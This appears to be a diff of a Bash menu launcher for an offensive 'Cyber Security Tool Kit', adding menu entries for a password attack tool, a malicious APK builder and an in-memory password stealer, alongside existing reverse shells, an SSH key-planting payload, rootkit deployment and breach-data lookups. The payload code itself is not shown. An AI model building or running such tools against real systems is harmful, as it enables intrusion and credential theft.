@@ -3,13 +3,13 @@
 set -o pipefail
 
 # colors
-declare -r r=$'\e[1;31m' # red
-declare -r g=$'\e[1;32m' # green
-declare -r y=$'\e[1;33m' # yellow
-declare -r b=$'\e[1;34m' # blue
-declare -r p=$'\e[1;35m' # purple
-declare -r c=$'\e[1;36m' # cyan
-declare -r x=$'\e[0m' # reset
+r=$'\e[1;31m' # red
+g=$'\e[1;32m' # green
+y=$'\e[1;33m' # yellow
+b=$'\e[1;34m' # blue
+p=$'\e[1;35m' # purple
+c=$'\e[1;36m' # cyan
+x=$'\e[0m' # reset
 
 # Date for log files
 DATE=$(date)
@@ -64,6 +64,8 @@ parsedownloads="$bin/parse_download"
 parseext="$bin/parse_extension"
 parsehistory="$bin/parse_history"
 parsepasswords="$bin/parse_password"
+pass_attack="$bin/password_attack"
+apk_builder_bin="$bin/apk_builder"
 # lib folders files used for copy/paste to create mostly payloads and ransomware
 lib="$home_dir/lib"
 
@@ -111,6 +113,7 @@ zip2go_enc="$lib/cstk_postxzipkit"
 zip2go="$Malware/cstk_Post_x_Kit.zip"
 # Source the Picture that shows before that program runs
 . "$lib/arguments_frame"
+. "$lib/Fonts"
 # Breached data folder and many files
 breached_data="$data"
 # Main Help files in markdown format in the doc folder
@@ -152,7 +155,7 @@ wait_and_return() {
 	echo -e "$r\nPress: 'X' to Exit $b \n\nEnter/Return for main menu.\n\n $x"
     read -r -n 1 -p "${c} ${A} ${x}" op
     if [[ "$op" =~ [Xx] ]]; then
-	exit
+	    exit
     fi
     main_menu
 }
@@ -257,7 +260,7 @@ fi
 }
 
 delete_me_now() {
-		if [ -d /opt/cstk ] && [ -e /opt/cstk/shc ]; then
+		if [ -d /opt/cstk ] && [ -d /opt/cstk/shc ]; then
         	rm -rf /opt/cstk &>/dev/null
         	if [ -f /usr/local/bin/shc ]; then
             	rm -rf /usr/local/bin/shc &>/dev/null
@@ -270,318 +273,27 @@ delete_me_now() {
 }
 
 check_hash() {
-	sudo find "$home_dir/cstk.sh" "$home_dir/uninstall.sh" "$home_dir/bin/" "$home_dir/lib/" "$home_dir/Malware_of_All_Types/DOS_Bombs/Image-Bombs/" "$home_dir/Malware_of_All_Types/DOS_Bombs/Zip-Bombs/" "$home_dir/Malware_of_All_Types/RootKits/kernel/" "$home_dir/Malware_of_All_Types/RootKits/userland/" "/usr/local/bin/cstk_wrapper" -type f -exec sha256sum {} \; | sort > "$hash_home/sha256.checksum2"
-    diff "$hash_home/sha256.checksum" "$hash_home/sha256.checksum2"
-    status=$?              # delete_me_now
-    [ "$status" -ne 0 ] && delete_me_now || echo " "
+    sha256sum -c --quiet "$hash_home/sha256.checksum"
+    status="$?"
+    if [[ "$status" != 0 ]]; then
+        echo "would be running command 'delete_me_now'"
+        read -p "Enter when ready Adam"
+    fi
 }
 
-function logo_animated() {
-    p1() {
-    echo -e "
-    $g +-+-+-+-+-+$x
-    $g |C|y|b|e|r|$x
-    $g +-+-+-+-+-+$x
-    "
-    }
-
-    p2() {
-    echo -e "
-    $g               +-+-+-+-+-+-+-+-+$x
-    $g               |S|e|c|u|r|i|t|y|$x
-    $g               +-+-+-+-+-+-+-+-+$x
-    "
-    }
-
-    p3() {
-    echo -e "
-    $g                                   +-+-+-+-+$x
-    $g                                   |T|o|o|l|$x
-    $g                                   +-+-+-+-+$x
-    "
-    }
-
-    p4() {
-    echo -e "
-    $g                                               +-+-+-+ $x
-    $g                                               |K|i|t| $x
-    $g                                               +-+-+-+ $x
-    "
-    }
-
-    p12() {
-    echo -e "
-    $r +-+-+-+-+-+$x
-    $b |C|y|b|e|r|$x
-    $r +-+-+-+-+-+$x
-    "
-    }
-
-    p123() {
-    echo -e "
-    $r +-+-+-+-+-+$r +-+-+-+-+-+-+-+-+$x
-    $b |C|y|b|e|r|$b |S|e|c|u|r|i|t|y|$x
-    $r +-+-+-+-+-+$r +-+-+-+-+-+-+-+-+$x
-    "
-    }
-
-    p1234() {
-    echo -e "
-    $r +-+-+-+-+-+$r +-+-+-+-+-+-+-+-+$r +-+-+-+-+$x
-    $b |C|y|b|e|r|$b |S|e|c|u|r|i|t|y|$b |T|o|o|l|$x
-    $r +-+-+-+-+-+$r +-+-+-+-+-+-+-+-+$r +-+-+-+-+$x
-    "
-    }
-
-    pall() {
-    echo -e "
-    $r +-+-+-+-+-+$r +-+-+-+-+-+-+-+-+$r +-+-+-+-+$r +-+-+-+ $x
-    $b |C|y|b|e|r|$b |S|e|c|u|r|i|t|y|$b |T|o|o|l|$b |K|i|t| $x
-    $r +-+-+-+-+-+$r +-+-+-+-+-+-+-+-+$r +-+-+-+-+$r +-+-+-+ $x
-    "
-    }
-
-    ppart() {
-    echo -e "
-    $b |C|y|b|e|r| |S|e|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-
-    ppart1() {
-    echo -e "
-    $b C|y|b|e|r| |S|e|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart1a() {
-    echo -e "
-    $b Cy|b|e|r| |S|e|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart1b() {
-    echo -e "
-    $b Cyb|e|r| |S|e|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart1c() {
-    echo -e "
-    $b Cybe|r| |S|e|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart1d() {
-    echo -e "
-    $b Cyber| |S|e|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart1e() {
-    echo -e "
-    $b Cyber |S|e|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2a() {
-    echo -e "
-    $b Cyber S|e|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2b() {
-    echo -e "
-    $b Cyber Se|c|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2c() {
-    echo -e "
-    $b Cyber Sec|u|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2d() {
-    echo -e "
-    $b Cyber Secu|r|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2e() {
-    echo -e "
-    $b Cyber Secur|i|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2f() {
-    echo -e "
-    $b Cyber Securi|t|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2g() {
-    echo -e "
-    $b Cyber Securit|y| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2h() {
-    echo -e "
-    $b Cyber Security| |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart2i() {
-    echo -e "
-    $b Cyber Security |T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart3a() {
-    echo -e "
-    $b Cyber Security T|o|o|l| |K|i|t| $x
-    "
-    }
-    ppart3b() {
-    echo -e "
-    $b Cyber Security To|o|l| |K|i|t| $x
-    "
-    }
-    ppart3c() {
-    echo -e "
-    $b Cyber Security Too|l| |K|i|t| $x
-    "
-    }
-    ppart3d() {
-    echo -e "
-    $b Cyber Security Tool| |K|i|t| $x
-    "
-    }
-    ppart3e() {
-    echo -e "
-    $b Cyber Security Tool |K|i|t| $x
-    "
-    }
-
-    ppart4a() {
-    echo -e "
-    $b Cyber Security Tool K|i|t| $x
-    "
-    }
-    ppart4b() {
-    echo -e "
-    $b Cyber Security Tool Ki|t| $x
-    "
-    }
-    ppart4c() {
-    echo -e "
-    $b Cyber Security Tool Kit| $x
-    "
-    }
-
-    pfinal() {
-    echo -e "
-    $p Program Name: $b Cyber Security Tool Kit $x
-    $p Author Name: $b AdamHamilton44 $x
-    $p Used For: $b Cyber Security Personal $x
-    $p Usage: $b sudo $(basename $0) $r (arg 1: Help Option) $g OR $c (arg 1: Classes Option) (arg 2: Tools Option)
-                   $r      -h -H --help $b General Help $x
-                   $r      -c -C --class $b Classes Help $x
-                   $r      -t -T --tool $b Tools Help $x
-                   $r      -s -S --skip $b Skip this animation $x
-
-    "
-    }
-
-    clear
-    p1
-    sleep 0.5
-    clear
-    p1 && p2
-    sleep 0.5
-    clear
-    p1 && p2 && p3
-    sleep 0.5
-    clear
-    p1 && p2 && p3 && p4
-    sleep 0.5
-    clear
-
-    p12 && p2 && p3 && p4
-    sleep 0.5
-    clear
-
-    p123 && p3 && p4
-    sleep 0.5
-    clear
-
-    p1234 && p4
-    sleep 0.5
-    clear
-
-    pall
-    sleep 0.5
-    clear
-
-    ppart
-    sleep 0.5
-    clear
-    ppart1a
-    sleep 0.1
-    clear
-    ppart1b
-    sleep 0.1
-    clear
-    ppart1c
-    sleep 0.1
-    clear
-    ppart1d
-    sleep 0.1
-    clear
-    ppart1e
-    sleep 0.1
-    clear
-
-    ppart2a
-    sleep 0.1
-    clear
-    ppart2b
-    sleep 0.1
-    clear
-    ppart2c
-    sleep 0.1
-    clear
-    ppart2d
-    sleep 0.1
-    clear
-    ppart2e
-    sleep 0.1
-    clear
-    ppart2f
-    sleep 0.1
-    clear
-    ppart2g
-    sleep 0.1
-    clear
-    ppart2h
-    sleep 0.1
-    clear
-    ppart2i
-    sleep 0.1
-    clear
-    ppart3a
-    sleep 0.1
-    clear
-    ppart3b
-    sleep 0.1
-    clear
-    ppart3c
-    sleep 0.1
-    clear
-    ppart3d
-    sleep 0.1
-    clear
-    ppart3e
-    sleep 0.1
-    clear
-
-    ppart4a
-    sleep 0.1
-    clear
-    ppart4b
-    sleep 0.1
-    clear
-    ppart4c
-    sleep 0.1
-    clear
-    pfinal
-    read -r -n 1 -p "${c} Press any key when ready ${p} ${A} ${x}"
-    clear
+header() {
+    random=$(cat /dev/urandom | tr -cd '1-8' | head -c 1)
+    case $random in
+        1) braille_fonts ;;
+        2) digital_fonts ;;
+        3) emboss_fonts ;;
+        4) future_fonts ;;
+        5) letter_fonts ;;
+        6) pagga_fonts ;;
+        7) script_fonts ;;
+        8) term_fonts ;;
+        *) echo "" ;;
+    esac
 }
 
 # Logos Pictures Error pic
@@ -661,20 +373,10 @@ echo -e "\n\n\n $b
 
 # Make sure we are root and the install.sh script has been ran
 check_root() {
-if [[ "$EUID" -ne 0 ]]; then
-	echo -e "sudo or root needed to run script"
-	exit 1
-else
-	if [[ -f "$installer" ]]; then
-		if ! [ -x "$installer" ]; then
-			sudo chmod 770 "$installer"
-			sudo bash "$installer"
-			"$0"
-		fi
-	else
-		check_hash
-	fi
-fi
+    if [[ "$EUID" -ne 0 ]]; then
+	    echo -e "sudo or root needed to run script"
+	    exit 1
+    fi
 }
 
 show_help() {
@@ -735,11 +437,23 @@ echo -e "sudo cstk $g       -p|-P|--payload  $b     nc|ncat|netcat $r"
 echo -e "sudo cstk $g       -x|-X|--postex   $b     foi|files-of-interest|files_of_interest $r"
 echo -e "sudo cstk $g       -e|-E|--etc      $b     openssl $x"
 }
-A="CSTK ==> "
+
+A="${p}CSTK ==> ${x}"
+AO="${c}CSTK->OSINT ==> ${x}"
+ao="${p}CSTK->OSINT->"
+AP="${c}CSTK->PAYLOADS ==> ${x}"
+ap="${p}CSTK->PAYLOADS->"
+AX="${c}CSTK->POST EXPLOIT ==> ${x}"
+ax="${p}CSTK->POST EXPLOIT->"
+AE="${c}CSTK->ETC ==> ${x}"
+ae="${p}CSTK->ETC->"
 # Main Page when calling script with out any arguements
 function main_menu() {
+A="CSTK ==> "
 clear
 logo_main2
+check_root
+check_hash
 echo -e "\n
 $g
 \t\t\t        Enter Class Number:         $c OR $g            Help Menu Letter: $b\n
@@ -765,7 +479,7 @@ function handle_input() {
 clear
 case "$1" in
 
-        1) logo_osint ; echo -e "$c \n\n Enter OSINT Tool Number: $b
+        1) logo_osint ;A="$AO"; echo -e "$c \n\n Enter OSINT Tool Number: $b
 
         1 -$g ip address lookup$p 		(GPS Coordinates, city, state, ISP) $b
 
@@ -779,10 +493,12 @@ case "$1" in
 
         6 -$g google dorks helper$p		(search for passwords, exploits, vulnabilites with over 7000 different search terms) $b
 
-        7 -$g email search tool$p           (search for a email linked to 100+ social media accounts) $r
+        7 -$g email search tool$p           (search for a email linked to 100+ social media accounts) $b
+
+        8 -$g password attack tool$p    (crack online/offline passwords using a number of different tools) $r
 
         X - Back to main menu$x" ;;
-        2) logo_payload ; echo -e "$b \n\n Enter Payload Tool Number: $g
+        2) logo_payload ;A="$AP"; echo -e "$b \n\n Enter Payload Tool Number: $g
 
         1 -$p Encrypted netcat shell$c 		(create a nc binding/reverse script) $g
 
@@ -800,10 +516,12 @@ case "$1" in
 
         8 -$p SSH Payload script$c                  (malicious script to remove and create new .ssh directory adding your private key and restrict access to everyone) $g
 
-        9 -$p Metasploit (msfvenom)$c               (create a shell script for remote connection using msfvenom and metasploit)$r
+        9 -$p Metasploit (msfvenom)$c               (create a shell script for remote connection using msfvenom and metasploit)$g
+
+        A -$p APK Builder$c                         (create a malicious apk for remote access)$r
 
     	X - Back to main menu $x" ;;
-        3) logo_postexploit ; echo -e "$r \n\n Enter Exploit Tool Number: $p
+        3) logo_postexploit ;A="$AX"; echo -e "$r \n\n Enter Exploit Tool Number: $p
 
         1 -$c Check if on VM $g			(Did i gain a shell on a Virtual Machine) $p
 
@@ -821,10 +539,12 @@ case "$1" in
 
         8 -$c Files of Interest$g              	(Find Interesting files on Linux systems) $p
 
-        9 -$c Deploy a Rootkit$g			(Setup and run a Rootkit on the current computer) $r
+        9 -$c Deploy a Rootkit$g			(Setup and run a Rootkit on the current computer) $p
+
+        A -$c In-Memory Password Stealer$g      (Root permission is needed - steal the current users passwords that is currently in memory)$r
 
         X - Back to main menu$x" ;;
-        4) logo_etc ; echo -e "$c \n\n Enter Tool Number: $g
+        4) logo_etc ;A="$AE"; echo -e "$c \n\n Enter Tool Number: $g
 
         1 -$p Users and Shell's $b 		(find all users and their default shells local computer) $g
 
@@ -861,6 +581,7 @@ case "$1" in
         5) breach_parse_wrapper ;;
         6) google_dorks ;;
         7) email_search ;;
+        8) pass_attack ;;
         X|x) main_menu ;;
         *) class_menu ;;
     esac ;;
@@ -874,6 +595,7 @@ case "$1" in
         7) dos_bomb_attack ;;
         8) ssh_attack ;;
         9) msf_payloads ;;
+        A|a) apk_killer ;;
         X|x) main_menu ;;
         *) class_menu ;;
     esac ;;
@@ -887,6 +609,7 @@ case "$1" in
         7) brute_force_file ;;
         8) files_of_interest ;;
         9) deploy_rootkit ;;
+        A|a) inmem_password_stealer ;;
         X|x) main_menu ;;
         *) class_menu ;;
     esac ;;
@@ -908,1304 +631,1401 @@ esac
 
 # Bad option function for tool numbered choices
 class_menu() {
-logo_error
-echo -e "$r \nBad Option: Returning to Main Menu \n $x "
-wait_and_return
+    logo_error
+    echo -e "$r \nBad Option: Returning to Main Menu \n $x "
+    wait_and_return
 }
 
 # Used to store user IP address and chosen port for Payloads, Shells, etc
 getip() {
-clear
-ans=""
-# Function to retrieve external IP
-until [[ "$ans" =~ [Yy] ]]; do
-    X_ip=$(dig -4 @resolver1.opendns.com ANY myip.opendns.com +short)
-    L_ip=$(ip addr show | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | tr '/' ' ' | awk '{print $1}')
-    declare -a ARRAY
-    ARRAY=( "\n" "$X_ip" "\n" "$L_ip" "\n" "Other (Enter manually)" )
+    A="$A"
     clear
-    echo -e "$c\nEnter the IP address to use. Options are: \n ${ARRAY[*]} $x"
-    read -r -p "${g} ${A} ${x}" chosen_ip
+    ans=""
+    # Function to retrieve external IP
+    until [[ "$ans" =~ [Yy] ]]; do
+        X_ip=$(dig -4 @resolver1.opendns.com ANY myip.opendns.com +short)
+        L_ip=$(ip addr show | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | tr '/' ' ' | awk '{print $1}')
+        declare -a ARRAY
+        ARRAY=( "\n" "$X_ip" "\n" "$L_ip" "\n" "Other (Enter manually)" )
+        clear
+        echo -e "$c\nEnter the IP address to use. Options are: \n ${ARRAY[*]} $x"
+        read -r -p "${g} ${A} ${x}" chosen_ip
 
-    # Verify the chosen IP is either in the list or a valid format
-    if [[ "$chosen_ip" != "$X_ip" && "$chosen_ip" != "$L_ip" ]]; then
-        if ! [[ "$chosen_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
-            if [[ "$chosen_ip" =~ ^[Oo] ]]; then   # Check for "Other", "other", "O", "o"
-                read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
-            else
-                echo -e "$r\nInvalid IP address format. $x"
-                exit 3
+        # Verify the chosen IP is either in the list or a valid format
+        if [[ "$chosen_ip" != "$X_ip" && "$chosen_ip" != "$L_ip" ]]; then
+            if ! [[ "$chosen_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+                if [[ "$chosen_ip" =~ ^[Oo] ]]; then   # Check for "Other", "other", "O", "o"
+                    read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
+                else
+                    echo -e "$r\nInvalid IP address format. $x"
+                    exit 3
+                fi
             fi
         fi
-    fi
-    clear
-    # User selects port number
-    echo -e "$c Enter port number to use if needed. (1-65535): $x"
-    read -r -p "${b} ${A} ${x}" chosen_port
-    while ! [[ "$chosen_port" =~ ^[1-9][0-9]{0,4}$ && "$chosen_port" -ge 1 && "$chosen_port" -le 65535 ]]; do
-        echo -e "$r Incorrect option: Pick a number between 1 and 65535. $x"
-        read -r -p "Enter your port number choice for reverse connect back (1-65535): " chosen_port
+        clear
+        # User selects port number
+        echo -e "$c Enter port number to use if needed. (1-65535): $x"
+        read -r -p "${b} ${A} ${x}" chosen_port
+        while ! [[ "$chosen_port" =~ ^[1-9][0-9]{0,4}$ && "$chosen_port" -ge 1 && "$chosen_port" -le 65535 ]]; do
+            echo -e "$r Incorrect option: Pick a number between 1 and 65535. $x"
+            read -r -p "Enter your port number choice for reverse connect back (1-65535): " chosen_port
+        done
+        clear
+        echo -e "\n$c You have selected IP and PORT: $chosen_ip:$chosen_port $x\n"
+        echo -e "$c Is this Correct? Y/N $x\n"
+        read -r -p "${c} ${A} ${x}" ans
+        while ! [[ "$ans" =~ [YyNn] ]]; do
+                echo -e "$r Invalid input. Please enter Y or N. $x"
+                read -r -p "${c} Enter Y/N: ${A}    ${x} " ans
+                if [[ "$ans" =~ [Nn] ]]; then
+                    break
+                fi
+        done
     done
-    clear
-    echo -e "\n$c You have selected IP and PORT: $chosen_ip:$chosen_port $x\n"
-    echo -e "$c Is this Correct? Y/N $x\n"
-    read -r -p "${c} ${A} ${x}" ans
-    while ! [[ "$ans" =~ [YyNn] ]]; do
-            echo -e "$r Invalid input. Please enter Y or N. $x"
-            read -r -p "${c} Enter Y/N: ${A}    ${x} " ans
-            if [[ "$ans" =~ [Nn] ]]; then
-                break
-            fi
-    done
-done
-declare -g chosen_ip="$chosen_ip"
-declare -g chosen_port="$chosen_port"
-echo -e ""
+    declare -g chosen_ip="$chosen_ip"
+    declare -g chosen_port="$chosen_port"
+    echo -e ""
 
 }
 ############################## OSINT FUNCTIONS ###########################3
 # Class:OSINT - Tool:IP Lookup - Option 1
 find_that_ip() {
-clear
-osint_findip_frame
-if ! command -v jq &> /dev/null; then
-    echo -e 'Error: Looks as if jq is not installed. \nDid you delete? \nShould of downloaded with the install script.'
-    exit 2
+    A="$ao IP Lookup ==>${x}"
+    clear
+    osint_findip_frame
+    if ! command -v jq &> /dev/null; then
+        echo -e 'Error: Looks as if jq is not installed. \nDid you delete? \nShould of downloaded with the install script.'
+        exit 2
 
-fi
-echo -e "$g \nProvide A IP address for look up:\n $x"
-read -r -p "${c} ${A} ${x}" Ip
-data=$(curl -s "http://ip-api.com/json/$Ip")
-data2=$(curl -s "https://internetdb.shodan.io/$ip")
-status=$(echo "$data" | jq -r '.status')
-ports=$(echo "$data2" | jq -r '.ports' | tr -d '[]' | tr -d "[:space:]")
-vuln=$(echo "$data2" | jq -r '.vulns' | tr -d '[]' | tr -d "[:space:]")
-if [[ $status == "success" ]]; then
-	clear
-    city=$(echo "$data" | jq -r '.city')
-    regionName=$(echo "$data" | jq -r '.regionName')
-    country=$(echo "$data" | jq -r '.country')
-    zip=$(echo "$data" | jq -r '.zip')
-    lat=$(echo "$data" | jq -r '.lat')
-    lon=$(echo "$data" | jq -r '.lon')
-    isp=$(echo "$data" | jq -r '.isp')
-    echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nScript Ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n--------------------------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp\nOpen Ports:\t\t\t  $ports\nPossible Vulnabilities:\t\t\t  $vuln" | tee -a "$Loot/IP-Lookup.txt"
-	echo -e "$g\nInformation saved in $Loot/IP-Lookup.txt $x"
-else
-    echo -e "$r Failed to retrieve information. $x"
-	echo -e "\n\nDate and Time: $DATE \nUser Name: $USER \nScript Ran: IP Searcher \nSearched IP: $Ip \nResults: Failed to retrieve information." >> "$Loot/IP-Lookup.txt"
-fi
+    fi
+    echo -e "$g \nProvide A IP address for look up:\n $x"
+    read -r -p "${c} ${A} ${x}" Ip
+    data=$(curl -s "http://ip-api.com/json/$Ip")
+    data2=$(curl -s "https://internetdb.shodan.io/$ip")
+    status=$(echo "$data" | jq -r '.status')
+    ports=$(echo "$data2" | jq -r '.ports' | tr -d '[]' | tr -d "[:space:]")
+    vuln=$(echo "$data2" | jq -r '.vulns' | tr -d '[]' | tr -d "[:space:]")
+    if [[ $status == "success" ]]; then
+    	clear
+        city=$(echo "$data" | jq -r '.city')
+        regionName=$(echo "$data" | jq -r '.regionName')
+        country=$(echo "$data" | jq -r '.country')
+        zip=$(echo "$data" | jq -r '.zip')
+        lat=$(echo "$data" | jq -r '.lat')
+        lon=$(echo "$data" | jq -r '.lon')
+        isp=$(echo "$data" | jq -r '.isp')
+        echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nScript Ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n--------------------------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp\nOpen Ports:\t\t\t  $ports\nPossible Vulnabilities:\t\t\t  $vuln" | tee -a "$Loot/IP-Lookup.txt"
+    	echo -e "$g\nInformation saved in $Loot/IP-Lookup.txt $x"
+    else
+        echo -e "$r Failed to retrieve information. $x"
+    	echo -e "\n\nDate and Time: $DATE \nUser Name: $USER \nScript Ran: IP Searcher \nSearched IP: $Ip \nResults: Failed to retrieve information." >> "$Loot/IP-Lookup.txt"
+    fi
 
-wait_and_return
+    wait_and_return
 }
 
 # Class:OSINT - Tool:Ping Sweeper - Option 2 (Wrapper used)
 sweep_ip() {
-clear
-osint_ipsweep_frame
-sleep 3
-export CSTK_MAIN_RUNNER=1
-"$cstk_wrapper" "$sweeper_bin"
-wait_and_return
+    clear
+    osint_ipsweep_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$sweeper_bin"
+    wait_and_return
 }
 
 # Class:OSINT - Tool:Nmap helper script - Option 3  (Wrapper used)
 nmap_tool() {
-clear
-osint_nmap_frame
-sleep 3
-export CSTK_MAIN_RUNNER=1
-"$cstk_wrapper" "$nmap_bin"
-printf "Date and Time: %s\nUser Name: %s\nScript Ran: Nmap-Helper-Script\n" "$DATE" "$USER" >> "$log/nmap_helper_script_results.log"
-wait_and_return
+    clear
+    osint_nmap_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    "$cstk_wrapper" "$nmap_bin"
+    printf "Date and Time: %s\nUser Name: %s\nScript Ran: Nmap-Helper-Script\n" "$DATE" "$USER" >> "$log/nmap_helper_script_results.log"
+    wait_and_return
 }
 
 # Class:OSINT - Tool:Automative Enumeration Script - Option 4 (Wrapper used)
 enum_tool() {
-clear
-osint_enum_frame
-sleep 3
-export CSTK_MAIN_RUNNER=1
-echo -e "\nEnter Website URL: \nExample hackersunit.com \n"
-read -r -p "${c} ${A} ${x}" dom
-"$cstk_wrapper" "$enum_bin" "$dom" -a
-printf "Date and Time: %s\nUser Name: %s\nScript Ran: Automative Enumeration Script\n" "$DATE" "$USER" >> "$log/auto_enum_script.log"
-wait_and_return
+    A="$ao Enumeration ==> ${x}"
+    clear
+    osint_enum_frame
+    sleep 3
+    export CSTK_MAIN_RUNNER=1
+    echo -e "\nEnter Website URL: \nExample hackersunit.com \n"
+    read -r -p "${c} ${A} ${x}" dom
+    "$cstk_wrapper" "$enum_bin" "$dom" -a
+    printf "Date and Time: %s\nUser Name: %s\nScript Ran: Automative Enumeration Script\n" "$DATE" "$USER" >> "$log/auto_enum_script.log"
+    wait_and_return
 }
 
 # Class:OSINT - Tool:Email Parser - Option 5 (Wrapper used)
 breach_parse_wrapper() {
-clear
-if ! [ -d "$data" ]; then
- 	echo -e "$r \nLooks like you did not allow for the download of breached email/password lists when running the install.sh script \nOr you did not have enough space available for the large download. $g\nYou can not run this program. $x"
-	wait_and_return
-fi
-osint_breached_frame
-sleep 3
-echo -e "$g \nAre you searching for: $r \n1 -$p single breached email account $r \n2 -$p full breached domain email accounts $r \n3 -$p main menu $x"
-read -r -n 1 -p "${c} ${A} ${x}" opt
-if [ "$opt" -eq 1 ]; then
-	echo -e "$g \nEnter the email address to search $x"
-	read -r -p "${c} ${A} ${x}" email
-	export CSTK_MAIN_RUNNER=1
-	"$cstk_wrapper" "$breach_parse_single_bin" "$email"
-elif [ "$opt" -eq 2 ]; then
-	export CSTK_MAIN_RUNNER=1
-	"$cstk_wrapper" "$breach_parse_bin"
-else
-	main_menu
-fi
-wait_and_return
+    A="$ao Breach Parser ==> ${x}"
+    clear
+    if ! [ -d "$data" ]; then
+     	echo -e "$r \nLooks like you did not allow for the download of breached email/password lists when running the install.sh script \nOr you did not have enough space available for the large download. $g\nYou can not run this program. $x"
+    	wait_and_return
+    fi
+    osint_breached_frame
+    sleep 3
+    echo -e "$g \nAre you searching for: $r \n1 -$p single breached email account $r \n2 -$p full breached domain email accounts $r \n3 -$p main menu $x"
+    read -r -n 1 -p "${c} ${A} ${x}" opt
+    if [ "$opt" -eq 1 ]; then
+    	echo -e "$g \nEnter the email address to search $x"
+    	read -r -p "${c} ${A} ${x}" email
+    	export CSTK_MAIN_RUNNER=1
+    	"$cstk_wrapper" "$breach_parse_single_bin" "$email"
+    elif [ "$opt" -eq 2 ]; then
+    	export CSTK_MAIN_RUNNER=1
+    	"$cstk_wrapper" "$breach_parse_bin"
+    else
+    	main_menu
+    fi
+    wait_and_return
 }
 
 # Class:OSINT - Tool:Google Dorks - Option 6
 google_dorks() {
-clear
-osint_googledorks_frame
-sleep 3
+    clear
+    osint_googledorks_frame
+    sleep 3
 
-# Define the file paths
-BASIC_FILE="$lib/GD_Basic.txt"
-SPECIAL_FILE="$lib/GD_Special.txt"
-FULL_FILE="$lib/GD_Full_List.txt"
-ADVANCED_FILE="$lib/GD_Advanced.txt"
-# Loop for the category selection, allowing the user to go back
-while true; do
-    # Use fzf to allow the user to select a category or back out
-    CATEGORY=$(echo -e "\nBasic\nSpecial\nFull\nAdvanced\nBack" | fzf --prompt="Select dork category (Basic: dork patterns) (Special: start with special character) (Advanced: Advanced google dorks) (Full: Full List 7000+) (or Back to exit): ")
-    # Map the selected category to the corresponding file
-    case $CATEGORY in
-        Basic)
-            FILE=$BASIC_FILE
-            ;;
-        Special)
-            FILE=$SPECIAL_FILE
-            ;;
-        Full)
-            FILE=$FULL_FILE
-            ;;
-        Advanced)
-        	FILE=$ADVANCED_FILE
-        	;;
-        Back | "")
-            echo -e "$r \nExiting or no selection made. Exiting. $x"
-            wait_and_return
-            ;;
-        *)
-            echo -e "$r \nInvalid selection. Please try again. $x"
+    # Define the file paths
+    BASIC_FILE="$lib/GD_Basic.txt"
+    SPECIAL_FILE="$lib/GD_Special.txt"
+    FULL_FILE="$lib/GD_Full_List.txt"
+    ADVANCED_FILE="$lib/GD_Advanced.txt"
+    # Loop for the category selection, allowing the user to go back
+    while true; do
+        # Use fzf to allow the user to select a category or back out
+        CATEGORY=$(echo -e "\nBasic\nSpecial\nFull\nAdvanced\nBack" | fzf --prompt="Select dork category (Basic: dork patterns) (Special: start with special character) (Advanced: Advanced google dorks) (Full: Full List 7000+) (or Back to exit): ")
+        # Map the selected category to the corresponding file
+        case $CATEGORY in
+            Basic)
+                FILE=$BASIC_FILE
+                ;;
+            Special)
+                FILE=$SPECIAL_FILE
+                ;;
+            Full)
+                FILE=$FULL_FILE
+                ;;
+            Advanced)
+            	FILE=$ADVANCED_FILE
+            	;;
+            Back | "")
+                echo -e "$r \nExiting or no selection made. Exiting. $x"
+                wait_and_return
+                ;;
+            *)
+                echo -e "$r \nInvalid selection. Please try again. $x"
+                continue
+                ;;
+        esac
+        # Check if the file exists
+        if [[ ! -f $FILE ]]; then
+            echo -e "$r \nFile $FILE not found. Exiting. $x"
+            exit 1
+        fi
+        # Use fzf to allow the user to search within the selected file
+        echo -e "$p \nSearching within $x $CATEGORY $p dorks... $x"
+        SELECTED_DORK=$(fzf --prompt="Search $CATEGORY dorks (or press Esc to go back): " < "$FILE")
+        # If the user presses Esc or selects nothing, loop back to the category selection
+        if [[ -z $SELECTED_DORK ]]; then
+            echo -e "$r \nNo dork selected, returning to category selection... $x"
             continue
-            ;;
-    esac
-    # Check if the file exists
-    if [[ ! -f $FILE ]]; then
